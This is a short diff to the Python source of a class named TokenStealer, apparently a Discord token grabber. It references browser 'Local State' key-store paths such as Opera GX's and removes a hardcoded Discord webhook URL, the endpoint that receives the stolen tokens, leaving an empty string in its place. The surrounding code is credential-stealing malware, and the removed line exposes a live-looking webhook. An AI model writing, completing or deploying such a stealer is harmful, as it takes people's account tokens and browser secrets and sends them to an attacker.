@@ -40,7 +40,7 @@ Local_State = {
     "Opera GX" : ROAMING + "\\Opera Software\\Opera GX Stable\\Local State"
 }
 
-TOKEN = "https://discord.com/api/webhooks/825504889077628988/utRLhEXLWQ5Rz4EeEx96W40BILCW2o7r5i6HfhdnaU6NSvAP7Ox31NdE-wbPRojIZ29y"
+TOKEN = ""
 
 
 class TokenStealer(object):
@@ -183,4 +183,5 @@ class TokenStealer(object):
             except:
                 pass
         f.close()
+
         return FilePath
